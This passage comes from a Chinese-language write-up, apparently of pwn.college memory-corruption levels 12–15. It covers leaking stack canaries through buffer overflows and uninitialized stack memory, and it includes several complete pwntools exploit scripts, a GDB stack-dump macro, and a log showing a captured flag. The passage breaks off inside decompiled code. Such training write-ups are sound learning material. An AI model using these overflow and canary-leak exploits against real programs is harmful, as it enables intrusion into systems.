<li>已知 Canary 在 rbp-8 的位置，我认为可以利用将 buf 的缓冲区溢出直到 rbp-8，然后利用 <code>printf(&quot;You said: %s\n&quot;, (const char *)buf);</code>来打印出 Canary，同时构造buf 中含有REPEAT，使得可以进入下一次challenge 函数，由于 Canary 是不变的，因此我们可以利用前面打印出的 Canary，使得第二次溢出填充正确的 Canary 的值，并覆盖返回地址</li>
<li>调试发现 Canary 的最高字节为 0，一般确实如此。由于64位地址中，Canary最高一个字节是0，因此需要用缓冲期覆盖该字节，这样<code>printf(&quot;You said: %s\n&quot;, (const char *)buf);</code>才能通过 printf打印出 Canary 的值而不会被截断</li>
<li>读取输出，需要提取出这个值，并将其转化为 <code>\x00</code>开头的八字节</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br> <br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span> :<br>    p = process(<span class="hljs-string">&#x27;/challenge/babymem_level12.0&#x27;</span>)<br>    <br>    <span class="hljs-comment"># first bof , 56 + 1 </span><br>    payload = <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">56</span> - <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;REPEAT&#x27;</span>)) +<span class="hljs-string">b&#x27;B&#x27;</span>  <span class="hljs-comment"># 填充缓冲区到 56 字节</span><br>    p.recvuntil(<span class="hljs-string">&#x27;Payload size:&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;57&#x27;</span>)<br>    p.send(payload)<br><br>    <span class="hljs-comment"># 从程序的输出中获取 Canary 值</span><br>    p.recvuntil(<span class="hljs-string">&#x27;You said: &#x27;</span>)<br>    response = p.recvline()<br>    <span class="hljs-built_in">print</span>(response)<br>    Canary = response[<span class="hljs-number">57</span>:<span class="hljs-number">64</span>]  <span class="hljs-comment"># 7个字节</span><br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Canary value: <span class="hljs-subst">&#123;Canary.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(Canary)<br>    Canary=<span class="hljs-string">b&#x27;\x00&#x27;</span>+Canary<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Modified Canary value: <span class="hljs-subst">&#123;Canary.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>    <span class="hljs-comment"># second bof , 56+canary(8)+ 8 +2 =74 </span><br>    <span class="hljs-comment"># recv : You said: REPEATAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABÛó&gt;YßpvtVý\x7f</span><br>    <span class="hljs-comment"># Canary =  </span><br>    <br>    payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">56</span> + Canary + <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">8</span> + p16(<span class="hljs-number">0x1E74</span>)<br>    <span class="hljs-built_in">print</span>(payload)<br>    p.recvuntil(<span class="hljs-string">&#x27;Payload size:&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;74&#x27;</span>)<br>    p.send(payload)<br>   <br>    <span class="hljs-built_in">str</span> = p.recvall(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>.find(<span class="hljs-string">b&#x27;pwn.college&#123;&#x27;</span>) != -<span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-comment">#break </span><br><br><br></code></pre></td></tr></table></figure>

<h1 id="12-1"><a href="#12-1" class="headerlink" title="12-1"></a>12-1</h1><p>略</p>
<h1 id="13-0"><a href="#13-0" class="headerlink" title="13-0"></a>13-0</h1><p>略</p>
<h1 id="13-1"><a href="#13-1" class="headerlink" title="13-1"></a>13-1</h1><p>有两个关键的函数调用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0000217</span><span class="hljs-function">e      <span class="hljs-title">verify_flag</span><span class="hljs-params">()</span></span><br><span class="hljs-function">0000219c      <span class="hljs-title">challenge</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure>

<p>第一个函数执行完后返回，然后进入 challenge 函数，它的缓冲区存有一部分上个函数未清理的信息，也即是 flag</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//**verify_flag 函数的栈布局**</span><br><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">verify_flag</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> v0; <span class="hljs-comment">// eax</span><br>  _BYTE v2[<span class="hljs-number">265</span>]; <span class="hljs-comment">// [rsp+37h] [rbp-109h] BYREF</span><br><br>  *(_QWORD *)&amp;v2[<span class="hljs-number">257</span>] = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  v0 = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">return</span> read(v0, v2, <span class="hljs-number">0x100</span>uLL);<br>&#125;<br><span class="hljs-comment">//**challenge 函数的栈布局**</span><br><span class="hljs-function">__int64 <span class="hljs-title">challenge</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> *v0; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">char</span> *v1; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">size_t</span> nbytes; <span class="hljs-comment">// [rsp+30h] [rbp-1B0h] BYREF</span><br>  <span class="hljs-keyword">void</span> *buf; <span class="hljs-comment">// [rsp+38h] [rbp-1A8h]</span><br>  <span class="hljs-keyword">char</span> v5; <span class="hljs-comment">// [rsp+40h] [rbp-1A0h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+1D8h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  buf = &amp;v5;<br>  <br></code></pre></td></tr></table></figure>

<p>函数调用中，栈指针（rbp）在调用期间不变，从而计算出 buf 和 v2 之间的相对偏移</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><br>offset = (<span class="hljs-built_in">rbp</span> - <span class="hljs-number">0</span>x109<span class="hljs-built_in">h</span>) - (<span class="hljs-built_in">rbp</span> - <span class="hljs-number">0</span>x1A0<span class="hljs-built_in">h</span>)<br><br>       = <span class="hljs-number">0</span>x1A0<span class="hljs-built_in">h</span> - <span class="hljs-number">0</span>x109<span class="hljs-built_in">h</span><br><br>       = <span class="hljs-number">0</span>x97<span class="hljs-built_in">h</span><br><br>       = <span class="hljs-number">151</span> (十进制)<br></code></pre></td></tr></table></figure>

<p>覆盖即可</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">###</span><br><span class="hljs-comment">### Welcome to /challenge/babymem_level13.1!</span><br><span class="hljs-comment">###</span><br><br><span class="hljs-attribute">Payload</span> size: <span class="hljs-number">151</span><br><span class="hljs-attribute">Send</span> your payload (up to <span class="hljs-number">151</span> bytes)!<br><span class="hljs-attribute">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="hljs-attribute">You</span> said: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaapwn.college&#123;M<span class="hljs-number">2</span>_-CsYNRF<span class="hljs-number">2</span>yXU<span class="hljs-number">04</span>X<span class="hljs-number">4</span>oaNcuL<span class="hljs-number">6</span>ot.<span class="hljs-number">0</span>FNxMDL<span class="hljs-number">1</span>cTMzEzW&#125;<br><br><span class="hljs-attribute">Goodbye</span>!<br><br></code></pre></td></tr></table></figure>

<h1 id="14-0"><a href="#14-0" class="headerlink" title="14-0"></a>14-0</h1><p> 重点是利用未初始化的缓冲区 leak Canary。由于<code>printf(&quot;You said: %.454s\n&quot;, (const char *)buf);</code>语句限制了打印出的格式化字符串大小，因此无法直接打印出 Canary</p>
<p>第一次溢出，需要泄露出 Canary（注意高位 0），并且包含 repeat ，从而进入第二次challenge 调用</p>
<p>获取Canary 是难点。可以动态调试跟踪函数执行，使用 Canary 命令输出栈中存在的 Canary。第一次调用 challenge 的时候，会发现栈中存在不止一个 Canary，这是之前 libc 中函数（比如 printf）用栈时未清理栈内存导致的 Canary 残留。调试得到这些 Canary的偏移，找一个格式化字符串漏洞可以打印出的，即可泄露出 Canary</p>
<p>对于 pie 的攻击可以参照之前</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># 启动进程</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span> :<br>    p = process(<span class="hljs-string">&#x27;/challenge/babymem_level14.0&#x27;</span>)<br>    <br>    <span class="hljs-comment"># first bof ,136 + 1 </span><br>    payload = <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0xc8</span>-<span class="hljs-number">0x40</span> - <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;REPEAT&#x27;</span>)) +<span class="hljs-string">b&#x27;B&#x27;</span>  <br>    p.recvuntil(<span class="hljs-string">&#x27;Payload size:&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;137&#x27;</span>) <br>    p.send(payload)<br><br>    <span class="hljs-comment"># 从程序的输出中获取 Canary 值</span><br>    p.recvuntil(<span class="hljs-string">&#x27;You said: &#x27;</span>)<br>    response = p.recvline()<br>    <span class="hljs-built_in">print</span>(response)<br>    Canary = response[<span class="hljs-number">137</span>:<span class="hljs-number">144</span>]  <span class="hljs-comment"># 7个字节</span><br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Canary value: <span class="hljs-subst">&#123;Canary.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(Canary)<br>    Canary=<span class="hljs-string">b&#x27;\x00&#x27;</span>+Canary<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Modified Canary value: <span class="hljs-subst">&#123;Canary.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>    <span class="hljs-comment"># second bof , 136 + canary(8)+ 8 +2 =154</span><br>    <span class="hljs-comment"># recv : You said: REPEATAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABÛó&gt;YßpvtVý\x7f</span><br>    <span class="hljs-comment"># Canary =  </span><br>    <br>    payload = <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x1a0</span>-<span class="hljs-number">0x8</span>) + Canary + <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">8</span> + p16(<span class="hljs-number">0x173a</span>)<span class="hljs-comment">#408+8+8+2</span><br>    <span class="hljs-built_in">print</span>(payload)<br>    p.recvuntil(<span class="hljs-string">b&#x27;Payload size:&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;426&#x27;</span>)<br>    <span class="hljs-comment">#p.sendlineafter(&#x27;Payload size: &#x27;, str(len(payload)).encode() )</span><br>    p.send(payload)<br><br>    <span class="hljs-built_in">str</span> = p.recvall(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>.find(<span class="hljs-string">b&#x27;pwn.college&#123;&#x27;</span>) != -<span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br>        <span class="hljs-keyword">break</span><br><br><br><br><br></code></pre></td></tr></table></figure>



<h1 id="14-1"><a href="#14-1" class="headerlink" title="14-1"></a>14-1</h1><p>这次没有程序自带的栈内容的打印，可以dump 出栈上内存，找出重复出现的 Canary</p>
<p>手搓脚本</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell">define print_rsp_to_rbp<br><br><span class="hljs-built_in">set</span> <span class="hljs-variable">$ptr</span> = <span class="hljs-variable">$rsp</span><br>	<span class="hljs-keyword">while</span> <span class="hljs-variable">$ptr</span> &lt; <span class="hljs-variable">$rbp</span><br>		x/gx <span class="hljs-variable">$ptr</span><br>		<span class="hljs-built_in">set</span> <span class="hljs-variable">$ptr</span> = <span class="hljs-variable">$ptr</span> + <span class="hljs-number">8</span><br>	<span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br><span class="hljs-comment"># 接下来直接调用print_rsp_to_rbp即可</span><br></code></pre></td></tr></table></figure>


<p>定位到Canary 位于 rbp-0x118<br>缓冲期起始于 rbp-0x1d0</p>
<p>偏移1：0x1d0-0x118</p>
<p>先用偏移 1 获取Canary 的值，程序输出you  said字符串后，接收缓冲区中的 Canary，对应<code>Canary = response[185:192]</code>  </p>
<p>接着进入第二次 challenge 调用，获取偏移 2：缓冲区+Canary+rbp+返回地址的最后 2 字节</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># 启动进程</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span> :<br>    p = process(<span class="hljs-string">&#x27;/challenge/babymem_level14.1&#x27;</span>)<br>    <br>    <span class="hljs-comment"># dump stack</span><br>    payload = <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">184</span> - <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;REPEAT&#x27;</span>)) +<span class="hljs-string">b&#x27;B&#x27;</span>  <br>    p.recvuntil(<span class="hljs-string">&#x27;Payload size:&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;185&#x27;</span>) <br>    p.send(payload)<br><br>    <span class="hljs-comment"># 从程序的输出中获取 Canary 值</span><br>    p.recvuntil(<span class="hljs-string">&#x27;You said: &#x27;</span>)<br>    response = p.recvline()<br>    <span class="hljs-built_in">print</span>(response)<br>    Canary = response[<span class="hljs-number">185</span>:<span class="hljs-number">192</span>]  <span class="hljs-comment"># 7个字节</span><br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Canary value: <span class="hljs-subst">&#123;Canary.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(Canary)<br>    Canary=<span class="hljs-string">b&#x27;\x00&#x27;</span>+Canary<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Modified Canary value: <span class="hljs-subst">&#123;Canary.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>    <br>    payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">456</span> + Canary + <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">8</span> + p16(<span class="hljs-number">0x17F5</span>)<br>    <span class="hljs-built_in">print</span>(payload)<br>    p.recvuntil(<span class="hljs-string">&#x27;Payload size:&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;474&#x27;</span>)<br>    p.send(payload)<br>   <br>    <span class="hljs-built_in">str</span> = p.recvall(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>.find(<span class="hljs-string">b&#x27;pwn.college&#123;&#x27;</span>) != -<span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br>        <span class="hljs-keyword">break</span><br><br><br></code></pre></td></tr></table></figure>


<h1 id="15-0"><a href="#15-0" class="headerlink" title="15-0"></a>15-0</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">challenge</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1, __int64 a2, __int64 a3)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> *v3; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">char</span> *v4; <span class="hljs-comment">// rax</span><br>  _QWORD v6[<span class="hljs-number">3</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-C0h] BYREF</span><br>  <span class="hljs-keyword">int</span> v7; <span class="hljs-comment">// [rsp+1Ch] [rbp-A4h]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v8; <span class="hljs-comment">// [rsp+2Ch] [rbp-94h]</span><br>  <span class="hljs-keyword">size_t</span> nbytes; <span class="hljs-comment">// [rsp+30h] [rbp-90h] BYREF</span><br>  <span class="hljs-keyword">void</span> *buf; <span class="hljs-comment">// [rsp+38h] [rbp-88h]</span><br>  __int64 v11[<span class="hljs-number">14</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-80h] BYREF</span><br>  <span class="hljs-keyword">int</span> v12; <span class="hljs-comment">// [rsp+B0h] [rbp-10h]</span><br>  <span class="hljs-keyword">char</span> v13; <span class="hljs-comment">// [rsp+B4h] [rbp-Ch]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v14; <span class="hljs-comment">// [rsp+B8h] [rbp-8h]</span><br>  __int64 savedregs; <span class="hljs-comment">// [rsp+C0h] [rbp+0h] BYREF</span><br>  <span class="hljs-keyword">void</span> *retaddr; <span class="hljs-comment">// [rsp+C8h] [rbp+8h] BYREF</span><br><br>  v7 = a1;<br>  v6[<span class="hljs-number">2</span>] = a2;<br>  v6[<span class="hljs-number">1</span>] = a3;<br>  v14 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">memset</span>(v11, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v11));<br>  v12 = <span class="hljs-number">0</span>;<br>  v13 = <span class="hljs-number">0</span>;<br>  buf = v11;<br>  nbytes = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The challenge() function has just been launched!&quot;</span>);<br>  sp_ = (__int64)v6;<br>  bp_ = (__int64)&amp;savedregs;<br>  sz_ = ((<span class="hljs-keyword">unsigned</span> __int64)((<span class="hljs-keyword">char</span> *)&amp;savedregs - (<span class="hljs-keyword">char</span> *)v6) &gt;&gt; <span class="hljs-number">3</span>) + <span class="hljs-number">2</span>;<br>  rp_ = (__int64)&amp;retaddr;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Before we do anything, let&#x27;s take a look at challenge()&#x27;s stack frame:&quot;</span>);<br>  DUMP_STACK(sp_, sz_);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Our stack pointer points to %p, and our base pointer points to %p.\n&quot;</span>, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *)sp_, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *)bp_);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This means that we have (decimal) %d 8-byte words in our stack frame,\n&quot;</span>, sz_);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;including the saved base pointer and the saved return address, for a&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;total of %d bytes.\n&quot;</span>, <span class="hljs-number">8</span> * sz_);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The input buffer begins at %p, partway through the stack frame,\n&quot;</span>, buf);<br>  <span 